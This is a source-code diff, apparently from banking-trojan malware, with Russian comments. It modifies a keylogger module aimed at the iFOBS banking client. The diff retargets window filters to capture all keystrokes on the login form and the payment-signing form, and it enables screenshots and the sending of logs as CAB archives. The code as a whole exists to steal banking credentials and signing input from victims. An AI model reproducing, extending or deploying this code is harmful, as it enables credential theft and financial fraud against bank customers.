@@ -231,6 +231,7 @@ static bool IsBtAccept( HWND wnd, const char* text )
 		pGetWindowTextA( wnd, buf, sizeof(buf) );
 		text = buf;
 	}
+
 	DWORD hash = STR::GetHash( (char*)text, 0, false );
 	int i = 0;
 	while( btAccept[i] && btAccept[i] != hash ) i++; //смотрим в массиве хешей
@@ -556,28 +557,32 @@ bool Init( const char* appName )
 	if( S != NULL )
 	{
 		//фильтр на форму регистрации
-		char* caption11 = "*iFOBS*ст*ац*я*";
-		char* caption12 = "*iFOBS*Regis*";
+//		char* caption11 = "*iFOBS*ст*ац*я*";
+//		char* caption12 = "*iFOBS*Regis*";
+		char* caption11 = "*iFOBS*";
+		char* classWnd1 = "*TLoginForm*";
 		S->MakeScreenShot = true;
 		S->SendLogAsCAB = true;
 		//S->OnDeactivate = Deactiveted;
 		S->OnMessage = OnMessage;
 		
-		PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, NULL, caption11, FILTRATE_PARENT_WND, LOG_ALL, 5);
+		PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, classWnd1, caption11, FILTRATE_PARENT_WND, LOG_ALL, 5);
 		m_lstrcpy( folderIFobs, appName ); //копируем путь к iFOBSClient.exe
 		pPathRemoveFileSpecA(folderIFobs); //папка с прогой
 		if( F1 )
 		{
-			KeyLogger::AddFilterText(F1, NULL, caption12 );
+			//KeyLogger::AddFilterText(F1, NULL, caption12 );
 			F1->OnActivate = Activeted1;
 		}
 		//фильтр на форму подписывания
-		char* caption21 = "*дписат*мен*"; //"подписать от имени", "Підписати від імені"
-		char* caption22 = "Sign*";
-		PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, true, NULL, caption21, FILTRATE_PARENT_WND, LOG_ALL, 5);
+//		char* caption21 = "*дписат*мен*"; //"подписать от имени", "Підписати від імені"
+//		char* caption22 = "Sign*";
+		char* caption21 = "*..*";
+		char* classWnd2 = "*TSignAsForm*";
+		PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, true, classWnd2, caption21, FILTRATE_PARENT_WND, LOG_ALL, 5);
 		if( F2 )
 		{
-			KeyLogger::AddFilterText(F2, NULL, caption22 );
+			//KeyLogger::AddFilterText(F2, NULL, caption22 );
 			F2->OnActivate = Activeted2;
 		}
 		//запускаем в отдельном потоке загрузку и установку плагина, ждем не более 10с
